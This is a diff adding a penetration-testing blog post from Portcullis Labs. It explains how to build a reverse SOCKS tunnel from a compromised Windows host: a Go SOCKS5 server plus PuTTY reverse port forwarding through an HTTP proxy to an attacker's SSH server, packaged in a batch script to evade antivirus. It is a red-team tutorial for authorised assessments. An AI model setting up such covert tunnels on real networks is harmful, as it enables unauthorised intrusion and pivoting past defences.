@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en-US" xmlns:fb="https://www.facebook.com/2008/fbml" xmlns:addthis="https://www.addthis.com/help/api-spec"  prefix="og: http://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<title>Reverse port forwarding SOCKS proxy via HTTP proxy (part 1) | Portcullis Labs</title>
+<meta name="viewport" content="initial-scale = 1.0, maximum-scale = 1.0, user-scalable = no, width = device-width">
+<!--[if lt IE 9]><script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+<link rel="stylesheet" href="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/style.css" media="screen" />
+
+
+<!-- This site is optimized with the Yoast WordPress SEO plugin v1.4.7 - http://yoast.com/wordpress/seo/ -->
+<link rel="canonical" href="https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/" />
+<meta property='og:locale' content='en_US'/>
+<meta property='og:type' content='article'/>
+<meta property='og:title' content='Reverse port forwarding SOCKS proxy via HTTP proxy (part 1) - Portcullis Labs'/>
+<meta property='og:url' content='https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/'/>
+<meta property='og:site_name' content='Portcullis Labs'/>
+<meta property='og:image' content='https://labs.portcullis.co.uk/wp-content/uploads/2019/01/protocol-flow-300x191.png'/>
+<meta property='og:image' content='https://labs.portcullis.co.uk/wp-content/uploads/2019/01/putty-proxy-300x282.png'/>
+<meta property='og:image' content='https://labs.portcullis.co.uk/wp-content/uploads/2019/01/user-prespective-300x110.png'/>
+<!-- / Yoast WordPress SEO plugin. -->
+
+<link rel="alternate" type="application/rss+xml" title="Portcullis Labs &raquo; Feed" href="https://labs.portcullis.co.uk/feed/" />
+<link rel='stylesheet' id='TheStyleSheets-css'  href='https://labs.portcullis.co.uk/wp-content/plugins/asm-brush/style.css?ver=3.8.5' type='text/css' media='all' />
+<link rel='stylesheet' id='wpfb-css'  href='//labs.portcullis.co.uk/wp-content/plugins/wp-filebase/wp-filebase.css?t=1475825177&#038;ver=3.4.4' type='text/css' media='all' />
+<link rel='stylesheet' id='contact-form-7-css'  href='https://labs.portcullis.co.uk/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=3.3.2' type='text/css' media='all' />
+<link rel='stylesheet' id='css3lightbox_style-css'  href='https://labs.portcullis.co.uk/wp-content/plugins/css3lightbox/assets/style.css?ver=3.8.5' type='text/css' media='all' />
+<link rel='stylesheet' id='addthis_all_pages-css'  href='https://labs.portcullis.co.uk/wp-content/plugins/addthis/frontend/build/addthis_wordpress_public.min.css?ver=3.8.5' type='text/css' media='all' />
+<!--[if lte IE 7]>
+<link rel='stylesheet' id='style.ie7.css-css'  href='https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/style.ie7.css?ver=3.8.5' type='text/css' media='screen' />
+<![endif]-->
+<link rel='stylesheet' id='style.responsive.css-css'  href='https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/style.responsive.css?ver=3.8.5' type='text/css' media='all' />
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/jquery.js?ver=3.8.5'></script>
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/script.js?ver=3.8.5'></script>
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/script.responsive.js?ver=3.8.5'></script>
+
+ 
+
+<link rel="shortcut icon" href="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/favicon.ico" /><link rel='header_link' href='/' /><style type="text/css" id="syntaxhighlighteranchor"></style>
+<script data-cfasync="false" type="text/javascript">if (window.addthis_product === undefined) { window.addthis_product = "wpp"; } if (window.wp_product_version === undefined) { window.wp_product_version = "wpp-6.1.4"; } if (window.wp_blog_version === undefined) { window.wp_blog_version = "3.8.5"; } if (window.addthis_share === undefined) { window.addthis_share = {}; } if (window.addthis_config === undefined) { window.addthis_config = {"data_track_clickback":false,"ignore_server_config":true,"ui_atversion":300}; } if (window.addthis_layers === undefined) { window.addthis_layers = {}; } if (window.addthis_layers_tools === undefined) { window.addthis_layers_tools = []; } else {  } if (window.addthis_plugin_info === undefined) { window.addthis_plugin_info = {"info_status":"enabled","cms_name":"WordPress","plugin_name":"Share Buttons by AddThis","plugin_version":"6.1.4","plugin_mode":"WordPress","anonymous_profile_id":"wp-3219ffbb80dfd9f649eb0d9d76c4d2e4","page_info":{"template":"posts","post_type":""},"sharing_enabled_on_post_via_metabox":false}; } 
+                    (function() {
+                      var first_load_interval_id = setInterval(function () {
+                        if (typeof window.addthis !== 'undefined') {
+                          window.clearInterval(first_load_interval_id);
+                          if (typeof window.addthis_layers !== 'undefined' && Object.getOwnPropertyNames(window.addthis_layers).length > 0) {
+                            window.addthis.layers(window.addthis_layers);
+                          }
+                          if (Array.isArray(window.addthis_layers_tools)) {
+                            for (i = 0; i < window.addthis_layers_tools.length; i++) {
+                              window.addthis.layers(window.addthis_layers_tools[i]);
+                            }
+                          }
+                        }
+                     },1000)
+                    }());
+                </script> <script data-cfasync="false" type="text/javascript"src="https://s7.addthis.com/js/300/addthis_widget.js#pubid=ra-50cef03053621092" async="async"></script><meta name="norton-safeweb-site-verification" content="t4bvmzb47z4-fa69d4guwu4ud9-4fjyp-p5zu1zngnplt83xrfxxg18yea8ev95lh9h4vlzkclbcvyu37rz5etuoczh7z3827pjv3s73uannz0xkwzfw2iiu4ol7o83f" />
+</head>
+<body class="single single-post postid-6813 single-format-standard">
+
+<div id="portcullis-main">
+
+
+<!-- Cisco -->
+<div id="cisco">
+    <div id="cisco-container" class="clearfix">
+        <div class="left">
+            <a href="http://www.cisco.com/" target="_blank"><img class="cisco-logo" src="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/images/portcullis_cisco_logo.png" alt=""></a>
+            <a href="http://www.cisco.com/web/about/ac49/ac0/ac1/ac259/portcullis.html" class="learnmore">Learn More <img src="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/images/more-triangle.png" alt=""></a>
+        </div>
+        <div class="right">
+            <div class="move-right"><a href="http://www.cisco.com/web/about/index.html" target="_blank" class="move-right">About Cisco</a></div>
+        </div>
+    </div>
+</div>
+<!-- /#cisco -->
+
+<header class="clearfix portcullis-header clickable">
+
+
+    <div class="portcullis-shapes">
+		<div class="portcullis-headline" data-left="14.6%">
+    <a href="https://labs.portcullis.co.uk/">Portcullis Labs</a>
+</div>
+		<div class="portcullis-slogan" data-left="16.4%">Research and Development</div>
+<div class="logo"><a href="https://www.portcullis-security.com"><img style="border:none;" src="/wp-content/themes/Portcullisfinal/images/logo.png" /></a></div>
+
+<div class="portcullis-textblock portcullis-object1741532833" data-left="92.34%">
+    
+</div><div class="portcullis-textblock portcullis-object1269462037" data-left="97.93%">
+    
+</div>
+            </div>
+
+<nav class="portcullis-nav clearfix">
+    
+<ul class="portcullis-hmenu">
+	<li class="menu-item-268"><a href="https://labs.portcullis.co.uk" title="Home">Home</a>
+	</li>
+	<li class="menu-item-6568"><a href="https://labs.portcullis.co.uk/advisories/" title="Advisories">Advisories</a>
+	</li>
+	<li class="menu-item-83"><a href="https://labs.portcullis.co.uk/blog/" title="Blog">Blog</a>
+	</li>
+	<li class="menu-item-66"><a href="https://labs.portcullis.co.uk/presentations/" title="Presentations">Presentations</a>
+	</li>
+	<li class="menu-item-62"><a href="https://labs.portcullis.co.uk/tools/" title="Tools">Tools</a>
+	</li>
+	<li class="menu-item-64"><a href="https://labs.portcullis.co.uk/whitepapers/" title="Whitepapers">Whitepapers</a>
+	</li>
+	<li class="menu-item-59"><a href="https://labs.portcullis.co.uk/downloads/" title="Downloads">Downloads</a>
+	</li>
+</ul>
+ 
+    </nav>
+
+                    
+</header>
+
+<div class="portcullis-sheet clearfix">
+            <div class="portcullis-layout-wrapper clearfix">
+                <div class="portcullis-content-layout">
+                    <div class="portcullis-content-layout-row">
+                        <div class="portcullis-layout-cell portcullis-content clearfix">
+							<article id="post-6813"  class="portcullis-post portcullis-article  post-6813 post type-post status-publish format-standard hentry category-blog tag-rdp tag-red-team tag-windows">
+                                <div class="portcullis-postmetadataheader"><h1 class="portcullis-postheader">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</h1></div>                                                <div class="portcullis-postheadericons portcullis-metadata-icons"><span class="portcullis-postdateicon"><span class="date">Published</span> <span class="entry-date" title="11:36">25/01/2019</span></span> | <span class="portcullis-postauthoricon"><span class="author">By</span> <span class="author vcard"><a class="url fn n" href="https://labs.portcullis.co.uk/author/mrl/" title="View all posts by MRL">MRL</a></span></span></div>                <div class="portcullis-postcontent clearfix"><div class="at-above-post addthis_tool" data-url="https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/"></div><!-- AddThis Button BEGIN -->
+<div class="addthis_toolbox addthis_default_style "><a class="addthis_button_email"><a class="addthis_button_twitter"></a><a class="addthis_button_reddit"></a></a>
+</div><p>In the context of a Red Team assessment, in this post I&#8217;ll look at some options for using SOCKS to gain external access to an internal network. I&#8217;ll cover the obvious methods and why I&#8217;m overlooking them, a crude method using standard tools (this post) and a more refined approach using modified tools (in part 2).<span id="more-6813"></span></p>
+<p>I recently spent quite a long time preparing for the <a title="CREST Certified Simulated Attack Specialist" href="https://www.crest-approved.org/examination/certified-simulated-attack-specialist/index.html">CREST Certified Simulated Attack Specialist</a> exam. While I won&#8217;t be discussing exam content (which I&#8217;m under NDA for), I thought it could be beneficial to write up at least some of the interesting stuff that I prepared prior to sitting the exam.</p>
+<p>I spent a lot of time testing my tools and techniques against 5 different Anti-Virus (AV) products. I wanted to be sure that I had enough options available to me during the exam to operate efficiently, even if AV was present.  One scenario that I wanted to be prepared for was:</p>
+<ul>
+<li>Having a foothold (command execution) on a <em>Windows </em>system in an internal network; but</li>
+<li>being unable to deploy my normal C2 software (<a title="Cobalt Strike" href="https://www.cobaltstrike.com/">Cobalt Strike</a> / <a title="Meterpreter" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/">Meterpreter</a>) due to Anti-Virus / Endpoint Protection.</li>
+</ul>
+<p>My practice had shown that I was able to deploy my C2 software of choice onto only 4 out 5 test systems. So this seemed like something I needed to prepare for. Just in case.</p>
+<p>In parallel with this, I&#8217;d found that performance of SOCKS over a reverse HTTPS connection was barely adequate for tunneling an RDP connection. So I was interested in finding a solution that was:</p>
+<ul>
+<li>Faster</li>
+<li>Worked through a proxy; and</li>
+<li>Worked in the presence of my nemesis AV product</li>
+</ul>
+<p>My instinct was to try to SSH out of the network and use the SOCKS proxy built into SSH.  There were a few problems with this approach:</p>
+<ol>
+<li>I needed an SSH client &#8211; which I could solve by using <a title="Putty" href="https://www.putty.org/">Putty</a> (read on for the reason I didn&#8217;t use plink)</li>
+<li>I needed to get an SSH connection out of the network &#8211; which could probably do via the proxy using <a title="HTTP CONNECT" href="https://en.wikipedia.org/wiki/HTTP_tunnel">HTTP CONNECT</a> in the same way used for legitimate TLS connections</li>
+<li>SSH allows SSH clients to send traffic through a SOCKS proxy running on the SSH server. This was the opposite to what I needed. I needed the SSH server (on the &#8220;internet&#8221;) to be able to access a SOCKS Proxy running on the SSH Client. Which is a Windows box in this scenario. If the compromised host had been a *NIX host, I could potentially have SSH&#8217;d to localhost with the -D option to get the SOCKS server running, then made a second connection to the Internet to port-forward access to the SOCKS service</li>
+</ol>
+<div id="attachment_6823" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6814"><div class="lb-album"><a href="#image-6814"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/protocol-flow-300x191.png" alt="Communication Flow between Devices" class="size-medium wp-image-6823"><span></span></a></div>              
+<a href="#imageclose-6814" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6814">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/protocol-flow.png" alt="image-6814">
+                   </div></a><p class="wp-caption-text">Communication flow between devices</p></div>
+<h2>Solving (3): SOCKS server</h2>
+<p>To solve (3) I looked for a small command line SOCKS proxy that ran on Windows. I did find some, but they all felt a bit dodgy and some said on their website that they definitely weren&#8217;t malware, despite what AV products said. Which is probably true, but it made them a poor option if I wanted to operate in the presence of AV.</p>
+<p>Eventually I stumbled on a <a title="SOCKS5 implementation written in golang" href="https://github.com/armon/go-socks5">SOCKS5 implementation written in golang</a> written by <a title="Armon Dagar" href="https://github.com/armon">Armon Dagar</a>. I&#8217;d heard that golang malware would be on the rise in 2019, so this was a good opportunity for me to waste valuable revision time on a side-interest. I&#8217;d never even compiled a golan program before. If this wasn&#8217;t too hard, it would be a nice cross-platform solution for my needs.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+$ mkdir -p ~/go/src
+$ cd !$
+$ git clone https://github.com/armon/go-socks5
+$ mv go-socks5 socks5
+$ cd socks5
+$ go build
+</pre>
+<p>No errors <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<p>But no server either. This is just a library! You need to write some code to use it. <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_sad.gif" alt=":-(" class="wp-smiley" /> </p>
+<p>Fortunately, the author provides an example that&#8217;s easily adapted:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+mkdir -p ~/go/src/mysocks5
+cd !$
+$ cat &lt;&lt; EOF &gt; mysocks.go
+// Create a SOCKS5 server
+package main
+import &quot;socks5&quot;
+
+func main() {
+  conf := &amp;socks5.Config{}
+  server, err := socks5.New(conf)
+  if err != nil {
+    panic(err)
+  }
+
+  // Create SOCKS5 proxy on localhost port 1080
+  if err := server.ListenAndServe(&quot;tcp&quot;, &quot;127.0.0.1:1080&quot;); err != nil {
+    panic(err)
+  }
+}
+EOF
+go build
+</pre>
+<p>Done! I now had a &#8220;mysocks5&#8243; executable. And it worked. Repeating similar steps on Windows gave me a working mysocks5.exe. I was starting to like golang at this point.</p>
+<h2>Solving (1): Putty configuration</h2>
+<p>After getting almost to the finish line with the following plink command, I couldn&#8217;t specify an HTTP proxy from the command line:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+plink -N -P 443 -i puttykey.priv.ppk -R 2080:127.0.0.1:1080 -hostkey db:b0:69:08:20:b1:61:2d:da:f4:e2:d8:0f:b8:71:9a tunnnel@192.168.0.1
+</pre>
+<p>A quick overview of options here:</p>
+<ul>
+<li>-N: &#8211; I don&#8217;t need a shell, just an SSH connection for port forwarding</li>
+<li>-P 443 &#8211; Target port 443, not 22 since the proxy is likely to restrict us in this way</li>
+<li>-i puttykey.priv.ppk &#8211; The private key to access my listening SSH server, I needed logon to be non-interactive, obviously</li>
+<li>-R 2080:127.0.0.1:1080 &#8211; Open a listening port (2080) on the SSH server and forward connections to that port to 127.0.0.1:1080 on the SSH client</li>
+<li>-hostkey db:b0:69:08:20:b1:61:2d:da:f4:e2:d8:0f:b8:71:9a &#8211; We don&#8217;t want any warnings or questions about unverified host keys</li>
+<li>tunnnel@192.168.0.1 &#8211; Log into 192.168.0.1 as user tunnel</li>
+</ul>
+<p>Using the normal putty.exe GUI, I saved a session that specified all of the above detail, plus the required proxy settings (unauthenticated in the case of my lab):</p>
+<div id="attachment_6822" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6815"><div class="lb-album"><a href="#image-6815"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/putty-proxy-300x282.png" alt="Proxy Settings for SSH Connection in Putty" class="size-medium wp-image-6822"><span></span></a></div>              
+<a href="#imageclose-6815" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6815">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/putty-proxy.png" alt="image-6815">
+                   </div></a><p class="wp-caption-text">Proxy settings for SSH connection in Putty</p></div>
+<p>I saved a putty session called myproxy, then retried plink:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+plink -load myproxy
+</pre>
+<p>It crashed. Hence, why I&#8217;m not using plink.  Putty works fine, though:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+putty -load myproxy
+</pre>
+<p>Well, sort of fine. The victim user would have a suspicious-looking putty window pop up alongside the mysocks console window. But this is just a PoC. Let&#8217;s ignore these missing optimisations!</p>
+<div id="attachment_6830" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6816"><div class="lb-album"><a href="#image-6816"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/user-prespective-300x110.png" alt="How the attack looks from user' class="size-medium wp-image-6830"><span></span></a></div>              
+<a href="#imageclose-6816" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6816">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/user-prespective.png" alt="image-6816">
+                   </div></a><p class="wp-caption-text">How the attack looks from user&#8217;s perspective</p></div>
+<p>On the server-side, we see a network listener on port 2080.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+tcp 0 0 0.0.0.0:2080 0.0.0.0:* LISTEN
+</pre>
+<p>I wanted the service bound to 0.0.0.0 for my environment, but consider that anyone with network access could abuse your SOCKS proxy.</p>
+<p>This provides a relatively high-performance SOCKS server &#8211; much better than those laggy SOCKS-over-reverse-HTTPS connections. Implants typically poll periodically over HTTPS, which means that traffic can only be sent when the implant calls home. The above method is more akin to SOCKS-over-reverse-TCP. Data can be sent in either direction immediately without waiting for a check-in. Arguably, the above method will create a more suspicious traffic pattern and some application-layer aware proxies won&#8217;t allow it (though tunneling over SSL could help).</p>
+<h2>Packaging it up</h2>
+<p>To deliver above attack, we need to package up the software and configuration so it can be run from the command line. We&#8217;ll assume that we can upload and unpack zip files for this part (or the post will get too long). I included the following in myproxy.zip:</p>
+<ul>
+<li>putty.exe</li>
+<li>mysocks5.exe</li>
+<li>myproxy.reg &#8211; Created by doing &#8220;reg export HKCU\Software\SimonTatham myproxy.reg&#8221;, then removing unnecessary configuration data in a text editor</li>
+<li>puttykey.priv.ppk &#8211; Created using puttygen, be sure to copy the openssh-format public key into ~tunnel/.ssh/authorized_key on the SSH server too</li>
+<li>mysocks.bat &#8211; See below</li>
+</ul>
+<p>To deploy, we need to run mysocks.bat, which does the following:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+reg import myproxy.reg
+start mysocks5
+putty -load myproxy
+</pre>
+<p>All finished. We can pivot through our fast SOCKS proxy. For example, to access RDP on the internal network, I&#8217;d do something like:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+$ cat /etc/proxychains.conf
+...
+socks5  127.0.0.1 2080
+$ proxychains remmina
+</pre>
+<p>Where <a title="remmina" href="https://remmina.org/">remmina</a> is a pretty awesome RDP client for Linux. You can also use <a title="proxifier" href="https://www.proxifier.com/">proxifier</a> on Windows if you&#8217;d rather use mstsc.exe.</p>
+<h2>Conclusion</h2>
+<p>We showed a PoC to get a reverse SOCKS connection out of a network using tools that won&#8217;t trigger AV. They don&#8217;t require privileges run, so would work against an unprivileged windows user. The connection is faster than if we&#8217;d used the SOCKS features of C2 solutions that use polling reverse-HTTPS connections.</p>
+<p>Our attack is untidy because the user can see everything that happens! It&#8217;s also awkward to set up because of the registry export and required packaging.</p>
+<h2>Further Reading</h2>
+<ul>
+<li><a title="Chisel" href="https://github.com/jpillora/chisel">Chisel</a> is a tool that can create a SOCKS-over-SSH-over-CONNECT-HTTP tunnel in the opposite direction the direction I needed</li>
+<li><a title="Crowbar" href="https://github.com/q3k/crowbar">Crowbar</a> is a tool that lets you do port forwarding over HTTP channels (no reliance on the proxy CONNECT method)</li>
+</ul>
+<br /> <div class="wpcf7" id="wpcf7-f375-p238-o1"><form action="/contact/" method="post" class="wpcf7-form">
+<div style="display: none;">
+<input type="hidden" name="_wpcf7" value="323" />
+<input type="hidden" name="_wpcf7_version" value="3.3.2" />
+<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f375-p238-o1" />
+<input type="hidden" name="_wpnonce" value="4c6cc9abab" />
+</div>
+<style>.portcullis-content .layout-item-0 { background: ; padding: 10px;  }
+.portcullis-content .layout-item-1 {  border-collapse: separate;  }
+.portcullis-content .layout-item-2 { border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-color:#C7C7C7;border-right-color:#C7C7C7;border-bottom-color:#C7C7C7;border-left-color:#C7C7C7; color: #1C1C1C; background: #FAFAFA url('https://www.portcullis-security.com/wp-content/uploads/2013/01/983aa2.png') scroll; padding: 10px; border-radius: 5px;  }
+.ie7 .post .layout-cell {border:none !important; padding:0 !important; }
+.ie6 .post .layout-cell {border:none !important; padding:0 !important; }</p>
+</style>
+<div class="portcullis-content-layout layout-item-1">
+<div class="portcullis-content-layout-row">
+<div class="portcullis-layout-cell layout-item-2" style="width: 80%" >
+</p>
+</p>
+<h3>Request to be added to the Portcullis Labs newsletter</h3>
+<p>
+ We will email you whenever a new tool, or post is added to the site.</p>
+<p>Your Name (required)<br />
+    <span class="wpcf7-form-control-wrap your-name"><input type="text" name="your-name" value="" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" size="40" required="required" /></span> </p>
+<p>Your Email (required)<br />
+    <span class="wpcf7-form-control-wrap your-email"><input type="text" name="your-email" value="" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email" size="40" required="required" /></span> </p>
+<p><input type="hidden" name="porpoise" value="newsletter" /><br />
+<input type="hidden" name="contact_form_7_recaptcha" value="g-recaptcha-jsuZpRcgj7mS4wt" class="g-recaptcha-explicit-id"><div id="g-recaptcha-jsuZpRcgj7mS4wt"></div><span class="wpcf7-form-control-wrap g-recaptcha-explicit" data-sitekey="6LdFERITAAAAAJKGS2TEXuWsyOxc-KxvAZBC8zE2"></span></p>
+<p><input type="submit" value="Subscribe" class="wpcf7-form-control  wpcf7-submit" /></p>
+</div>
+</div>
+</div>
+<div class="wpcf7-response-output wpcf7-display-none"></div></form></div></br ><div style="clear:both;"></div><!-- AddThis Advanced Settings above via filter on the_content --><!-- AddThis Advanced Settings below via filter on the_content --><!-- AddThis Button BEGIN -->
+<div class="addthis_toolbox addthis_toolbox addthis_default_style addthis_32x32_style"><a class="addthis_button_email"><a class="addthis_button_twitter"></a><a class="addthis_button_reddit"></a></a>
+</div><!-- AddThis Advanced Settings generic via filter on the_content --><!-- AddThis Share Buttons above via filter on the_content --><!-- AddThis Share Buttons below via filter on the_content --><div class="at-below-post addthis_tool" data-url="https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/"></div><!-- AddThis Share Buttons generic via filter on the_content --></div>
+                                                                
+</article>
+				
+
+                        </div>
+                                            </div>
+                </div>
+            </div><footer class="portcullis-footer clearfix"><div class="portcullis-content-layout">
+    <div class="portcullis-content-layout-row">
+    <div class="portcullis-layout-cell" style="width: 100%">
+        <p><br></p>
+    </div>
+    </div>
+</div>
+<div class="portcullis-content-layout">
+    <div class="portcullis-content-layout-row">
+    <div class="portcullis-layout-cell" style="width: 33%">
+        <p style="text-align: left;"><span style="font-size: 17px; padding-left:40px; font-family: Tahoma;"><span style="color: #ffffff;">Research and Development</span><br></span></p>
+        <ul>
+        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/advisories/">Advisories</a><br></span></li>
+        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/blog/">Blog</a><br></span></li>
+        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/presentations/">Presentations</a><br></span></li>
+        <li style="text-align: left; padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/tools/">Tools</a><br></span></li>
+        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/whitepapers/">Whitepapers</a><br></span></li>
+        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/downloads/">Downloads</a><br></span></li>
+               </ul>
+        <p><br></p>
+    </div><div class="portcullis-layout-cell" style="width: 34%">
+        <p style="text-align: left;"><span style="font-size: 17px;"><span style="font-family: Tahoma;"><span style="font-weight: normal; color: #ffffff;">Company</span><br></span></span></p>
+        <ul>
+       <li style="text-align: left;"><span style="font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/contact-us/">Contact Us</a><span style="font-size: 12px;"><br></span></span></li>
+        <li style="text-align: left;"><span style="font-family: Tahoma;"><a href="https://www.portcullis-security.com">Portcullis Computer Security Services</a><span style="font-size: 12px;"><br></span></span></li>
+                </ul>
+        <br>
+    </div><div class="portcullis-layout-cell" style="width: 33%">
+       <span style="color: #ffffff;"><br>
+        <br>
+        <p style="text-align: left;"><span style="color: #ffffff; font-family: Tahoma;"><span style="color: #ffffff;"><span style="font-size: 15px; color: #ffffff;">Follow Us</span> <span style="font-weight: bold;"> <a href="http://www.twitter.com/portcullislabs" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Portcullis Twitter" class="" src="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/images/twitterfooter.png"></a> <a href="http://www.linkedin.com/company/portcullis?trk=hb_tab_compy_id_505813" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Portcullis Linkedin" class="" src="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/images/linkedinfooter.png"></a> <a href="http://www.facebook.com/PortcullisCSL" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Portcullis Facebook" class="" src="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/images/facebookfooter.png"></a> <a href="https://plus.google.com/114151721382021849037/posts" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Google Plus" class="" src="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/images/googleplusfooter.png"></a> <a href="/rss" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Portcullis Rss" class=""img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/04/rss.png"></a></span></span></span></p>
+        <p><br></p>
+    </div>
+    </div>
+</div>
+<div class="portcullis-content-layout">
+    <div class="portcullis-content-layout-row">
+    <div class="portcullis-layout-cell" style="width: 100%">
+        <p><br></p>
+        <hr>
+    </div>
+    </div>
+</div>
+<div class="portcullis-content-layout">
+    <div class="portcullis-content-layout-row">
+    <div class="portcullis-layout-cell" style="width: 50%">
+      <p style="text-align: left;"><span style="color: #ffffff; font-size: 12px; font-family: Tahoma;">© Portcullis Computer Security Ltd & Portcullis Inc. All rights reserved. ® 1992 - 2017.</span></p>
+    </div><div class="portcullis-layout-cell" style="width: 50%">
+        <p style="text-align: right;"><span style="color: #ffffff; font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/terms-of-use/">Terms of Use</a> </span>| <span style="color: #ffffff; font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/privacy-and-cookies/">Privacy and Cookies</a></span></p>
+    </div>
+    </div>
+</div></footer>
+
+    </div>
+</div>
+
+
+
+<div id="wp-footer">
+	<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9b'></script>
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushBash.js?ver=3.0.9b'></script>
+<script type='text/javascript'>
+	(function(){
+		var corecss = document.createElement('link');
+		var themecss = document.createElement('link');
+		var corecssurl = "https://labs.portcullis.co.uk/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
+		if ( corecss.setAttribute ) {
+				corecss.setAttribute( "rel", "stylesheet" );
+				corecss.setAttribute( "type", "text/css" );
+				corecss.setAttribute( "href", corecssurl );
+		} else {
+				corecss.rel = "stylesheet";
+				corecss.href = corecssurl;
+		}
+		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
+		var themecssurl = "https://labs.portcullis.co.uk/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeMidnight.css?ver=3.0.9b";
+		if ( themecss.setAttribute ) {
+				themecss.setAttribute( "rel", "stylesheet" );
+				themecss.setAttribute( "type", "text/css" );
+				themecss.setAttribute( "href", themecssurl );
+		} else {
+				themecss.rel = "stylesheet";
+				themecss.href = themecssurl;
+		}
+		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
+		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
+	})();
+	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
+	SyntaxHighlighter.config.strings.help = '?';
+	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
+	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
+	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
+	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
+	SyntaxHighlighter.all();
+</script>
